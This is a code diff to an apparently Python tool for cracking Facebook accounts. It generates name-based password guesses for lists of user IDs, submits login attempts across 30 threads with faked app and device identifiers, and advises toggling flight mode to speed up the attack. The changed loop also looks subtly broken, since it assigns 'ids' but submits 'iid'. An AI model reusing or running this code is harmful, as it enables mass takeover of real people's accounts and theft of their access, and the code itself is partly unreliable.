@@ -438,7 +438,7 @@ class crack_main():
                 self.pasw()
         def m1(self,iid,name,passlist):
                 try:
-                        global ok,loop,android_models
+                        global ok,loop,android_models,sim_id
                         sys.stdout.write('\r[ZEE] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
@@ -447,7 +447,6 @@ class crack_main():
                                 ln = fn
                         for pw in passlist:
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-                                infos = open('device_info.txt','r').read()
                                 fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                 fbbv = str(random.randint(111111111,999999999))
                                 android_version = device['android_version']
@@ -555,27 +554,23 @@ class crack_main():
                 input('\n Press enter to back ')
                 main()
         def zee(self):
-                passlist = []
-                os.system('clear')
-                print(logo)
-                print(' for auto password list type auto or Auto')
-                print(50*"=")
-                print(' Example first123,last123,khan123,firstlast')
-                print(50*"=")
-                pl = input(' Type Here password ')
-                print(50*"=")
-                for cd in range(int(pl)):
-                        passlist.append(input(f' ({cd+1}) Password : '))
-                os.system('clear')
-                print(logo)
-                print(' Total Ids : '+str(len(self.id)))
-                print(' Cloning Is Started Wait For Results')
-                print(' After Every 5 Min Turn Airplane On/Off')
-                print(50*'=')
-                with ThreadPool(max_workers=30) as formSubmit:
-                        for user in self.id:
-                                iid,name = user.split('|')
-                                formSubmit.submit(self.m1,iid,name,passlist)
+                with tred(max_workers=30) as Zee:
+                        total = str(len(fo))
+                        clear()
+                        print(' Total account : \033[1;32m'+total)
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print(50*'=')
+                        for user in fo:
+                                ids,name = user.split('|')
+                                first_name = name.rsplit(' ')[0]
+                                try:
+                                        last_name = name.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                Zee.submit(self.m1,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
